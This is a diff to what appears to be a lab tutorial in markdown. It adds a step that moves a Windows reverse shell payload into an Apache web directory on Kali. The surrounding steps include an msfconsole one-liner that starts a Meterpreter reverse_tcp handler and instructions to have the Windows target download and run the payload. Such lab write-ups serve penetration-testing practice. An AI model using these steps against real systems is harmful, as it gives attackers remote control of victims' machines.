@@ -12,7 +12,19 @@ Generates a reverse shell payload for Windows.
 
 (Add screenshot: payload creation)
 
-## Step 2: Start Apache Server
+## Step 2: Move Payload to Web Directory
+
+Create Folder:
+```bash
+mkdir /var/www/html/share
+```
+Then Move payload to the share folder
+```bash
+mv shell.exe /var/www/html/share/
+```
+Moves the payload file to Apache web directory.
+
+## Step 3: Start Apache Server
 ```bash
 sudo service apache2 start
 ```
@@ -20,7 +32,7 @@ Starts a web server to host the payload.
 
 (Add screenshot: apache running)
 
-## Step 3: Start Metasploit Listener
+## Step 4: Start Metasploit Listener
 ```bash
 msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <Kali ip>; set LPORT 4444; run"
 ```
@@ -28,7 +40,7 @@ Prepares listener to receive reverse connection.
 
 (Add screenshot: handler running)
 
-## Step 4: Download and Execute Payload on Windows
+## Step 5: Download and Execute Payload on Windows
 Open browser on Windows and visit:
 `http://<Kali-IP>/`
 
@@ -37,7 +49,7 @@ Executes the reverse shell payload and initiates connection.
 
 (Add screenshot: download + execution)
 
-## Step 5: Gain Access on Kali
+## Step 6: Gain Access on Kali
 Once payload executed in target machine, a Meterpreter session is opened.
 Provides remote access to the target system.
 
